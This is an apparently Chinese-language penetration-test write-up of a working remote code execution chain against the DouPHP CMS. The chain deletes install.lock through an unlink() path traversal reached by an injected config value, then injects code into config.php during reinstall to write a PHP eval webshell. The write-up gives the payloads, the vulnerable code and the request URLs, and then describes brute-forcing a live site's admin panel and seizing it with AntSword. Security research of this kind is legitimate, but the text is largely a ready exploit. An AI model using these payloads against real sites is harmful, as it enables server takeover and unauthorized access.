**声明**

> 本次实践是在合法授权情况下进行，数据已经全部脱敏，目的是提供思路交流学习，请勿用于任何非法活动，否则后果自负。

# 实战记录

### 信息收集

 **1，踩点站点**

通过fofa 查到目标DouPHP框架该站点（也测试了信息收集安全），由于是一个开源框架，因此选择下载源码，先通过白盒走查，发现隐藏的安全问题。

![image-20220414143342971](https://image.3001.net/images/20220415/1650015073_62593b616637422fd280a.png!small)

![image-20220415172500506](https://image.3001.net/images/20220415/1650015074_62593b62d8496fd7f6b63.png!small)

 **2 本地代码走查并复现bug**

完成本地搭建cms，在安装的页面中发现录入的内容会在一个配置文件中进行保存，因为后续要执行大概率是php文件，通过配置文件匹配，发现了config.php配置文件。

![image-20220414143604907](https://image.3001.net/images/20220415/1650015077_62593b65123a7c60c57ef.png!small)

打开配置文件，发现是双引号，说明此处我可以搞事情，尝试双引号闭合执行。

![image-20220414143639979](https://image.3001.net/images/20220415/1650015079_62593b67215364a0c7037.png!small)

删除`install.lock`文件，尝试从配置页面注入payload。

    
    
    ${file_put_contents('666.php','<?php eval($_REQUEST[8])?>'}
    

注入报错，但配置文件却写入成功，发现单引号被转义了，应该是用了类似输入预处理的方法。

![image-20220414144119883](https://image.3001.net/images/20220415/1650015085_62593b6d7b045986bb5e5.png!small)

![image-20220414144140443](https://image.3001.net/images/20220415/1650015095_62593b77159dda63e959d.png!small)

因此更换注入方式，既然你对单引号进行转义，那我就写入GET传参的形式，通过GET请求来将shell写入，时间换空间。

    
    
    ${file_put_contents($_GET[1],$_GET[2])}
    

发现写入配置文件成功。  
![image-20220414144214138](https://image.3001.net/images/20220415/1650015095_62593b77eca8874b00f1b.png!small)

通过GET请求来写shell,注意双引号执行需要php版本在5.5以上才能生效。

    
    
    http://192.168.186.129/douphp/data/config.php?1=666.php&2=<?php eval($_REQUEST[8])?>
    

发现shell写入成功，说明只要有安装页面，这条RCE的路是通的，但线上站点基本没有这个安装页面怎么办？  
![image-20220414144258176](https://image.3001.net/images/20220415/1650015097_62593b79c94dad4c91b83.png!small)

![image-20220414144317860](https://image.3001.net/images/20220415/1650015100_62593b7c39447c0c220ff.png!small)

根据之前的操作发现，每次安装成功就会有一个install.lock文件，只要能再线上删除这个文件，就能访问安装页面，那问题就是如何能线上删除该文件？  
![image-20220414144331909](https://image.3001.net/images/20220415/1650015102_62593b7e486c20a439a63.png!small)

在php中有unlink()函数支持文件的删除，因此进行代码审计，看下该CMS下有没有包含unlink函数的文件。  
![image-20220414144358394](https://image.3001.net/images/20220415/1650015104_62593b80026d3219dd633.png!small)  
逐个排查unlink()的形参中，有没有能为我所用的入参，排查发现admin目录下的mobile.php文件中的unlink()函数有突破点。  
![image-20220414144417674](https://image.3001.net/images/20220415/1650015118_62593b8ebaec740acafa4.png!small)

    
    
    @ unlink(ROOT_PATH . M_PATH . '/theme/' . $_CFG['mobile_theme'] . '/images/' . $mobile_logo);
     PHP语法中：
    // $变量 x()函数  ROOT_PATH 常量，发现存在$mobile_logo的变量，因此进一步排查变量的内容；
    
    
    
    $mobile_logo = $dou->get_one("SELECT value FROM " . $dou->table('config') . " WHERE name = 'mobile_logo'");
    //变量定义中是一段sql的拼接聪数据库拿数据，因此去数据库确认下表和字段是否存在
    

发现存在上述sql语句对应的表和字段。  
![image-20220414144452058](https://image.3001.net/images/20220415/1650015136_62593ba0c1a0ca2138c84.png!small)

接下来就是拼接链接，看看该sql语句所对应的业务逻辑是啥。

    
    
    http://192.168.186.129/douphp/admin/mobile.php
    

发现该页面是后台，用注册的用户名密码登陆后，发现有疑似mobile log相对应的功能。  
![image-20220414144548217](https://image.3001.net/images/20220415/1650015151_62593baf9c0723c2665bf.png!small)

长传图片后发现，出现了删除图片的功能，并已经落库。  
![image-20220414144608978](https://image.3001.net/images/20220415/1650015162_62593bba38ad7058ce49c.png!small)![image-20220414144632057](https://image.3001.net/images/20220415/1650015165_62593bbd3594d5fb0221b.png!small)

此时我需要知道上传图片的路径是什么，因为需要这个路径来反向推理出lock文件的位置，因此修改代码进行debug。  
![image-20220414144652578](https://image.3001.net/images/20220415/1650015170_62593bc23266040b2cb8a.png!small)通过删除按钮触发，顺利触发文件位置的提示，并且确认了代码执行的顺序。  
![image-20220414144711640](https://image.3001.net/images/20220415/1650015173_62593bc52b276905d3e45.png!small)接下来我就需要通过图片的位置，来倒推install.lock的相对路径。

    
    
    C:/phpstudy/WWW/douphp/m/theme/default/images/logo.jpg
    倒推install.lock的路径为
    ../../../../data/install.lock
    

相对路径获取后，接下来的思路就是将该路径存入数据库，那触发删除的时候，就能把对应的install.lock的文件删除了，接下来印证猜想。  
![image-20220414144743734](https://image.3001.net/images/20220415/1650015195_62593bdb76e3b97f651a6.png!small)删除文件后，发现触发数据库的../../../../data/install.lock文件路径，install.lock文件被成功删除，顺利进入到重装页面，说明整体思路没有错。  
![image-20220414144813169](https://image.3001.net/images/20220415/1650015199_62593bdf50b9676b0bc67.png!small)![image-20220414144829824](https://image.3001.net/images/20220415/1650015206_62593be64a48bb2e03edc.png!small)

那现在的问题就是如何将../../../../data/install.lock直接写入数据库?继续代码走查，发现突破点。  
![image-20220414144926620](https://image.3001.net/images/20220415/1650015220_62593bf468b31221db562.png!small)

    
    
    foreach ($_POST as $name => $value) {
                if (is_array($value)) $value = serialize($value);
                $dou->query("UPDATE " . $dou->table('config') . " SET value = '$value' WHERE name = '$name'");
            }
            
            此处存在键值分离（$_POST as $name => $value)），代码可以看成
            update config set value=$value where name=$name;
            那么
            $value = '../../../../data/install.lock'
            $name = 'mobile_logo'
            那就能完成写入。
        
    

提交mobile页，开启burp，进行改包，由于我希望直接进入绿色模块的判断逻辑，因此改下body体  
![image-20220414144956344](https://image.3001.net/images/20220415/1650015240_62593c08c1f118af12200.png!small)![image-20220414145009872](https://image.3001.net/images/20220415/1650015246_62593c0ee3a2c91737eca.png!small)

继续在post请求中改我需要的数据，并确认数据库写入成功，说明该流程没问题，接下来就是线上复现。  
![image-20220414145034168](https://image.3001.net/images/20220415/1650015264_62593c2027db859fda91a.png!small)![image-20220414145051963](https://image.3001.net/images/20220415/1650015277_62593c2ddef2eee72be52.png!small)

## 线上渗透复现

通过目录和账号爆破，进入线上的后台  
![image-20220414145112589](https://image.3001.net/images/20220415/1650015283_62593c33e1e534237d883.png!small)同样的流程改包后提交。

![image-20220414151008243](https://image.3001.net/images/20220415/1650015286_62593c36c778918130e6a.png!small)

上传成功后，点击删除，触发路径。

![image-20220414145139799](https://cdn.jsdelivr.net/gh/heiyu-sec/Image/202204141451056.png  
![image-20220414145202225](https://image.3001.net/images/20220415/1650015297_62593c41ed3f867ddc964.png!small)

发现能够进入安装页面了，说明流程成功，install.lock文件顺利删除。  
![image-20220414145225127](https://image.3001.net/images/20220415/1650015304_62593c48b4e38dfe1e3e4.png!small)

写入准备好的shell，后续用get传参来写马。

    
    
    ${file_put_contents($_GET[1],$_GET[2])}
    

![image-20220414145309399](https://image.3001.net/images/20220415/1650015313_62593c519d3aa6cafe92b.png!small)

通过GET请求生成新文件并在其中写入shell，避开单引号的预处理。

    
    
    http://域名/data/config.php?1=123.php&2=<?php eval($_REQUEST[8])?>
    

写入成功，使用PHPinfo();确认成功。  
![image-20220414145418690](https://image.3001.net/images/20220415/1650015332_62593c64ec3101ed5967d.png!small)使用蚁剑，拿下站点，建立稳定的webshell，搞定！  
![image-20220414145450443](https://image.3001.net/images/20220415/1650015344_62593c70c9ed7c9093a5c.png!small)

## 实战复盘

1，信息收集阶段，通过fofa来搜索指定开发框架的站点；  
2，通过本地的代码走查，寻找危险函数并逐个定位，寻找可利用的代码文件；  
3，重现过程中，一般成熟的CMS都会对单引号等进行转义，此时可以通过后续请求传参的方式来绕过；  
4，如果复现过程中需要删除某些文件来实现特定测试步骤，可以通过unlink()函数来定位进行；  
5，在unlink()函数定位过程中，寻找可利用变量的模块进行尝试，一些全常量的模块及时放弃；  
6，可以通过代码调试的方式寻找正常逻辑下文件的路径，然后倒推路径来为我所用；  
7，线上进行复现的时候细心，遇到和本地调试不一样的结果，需要看报错及时调整；

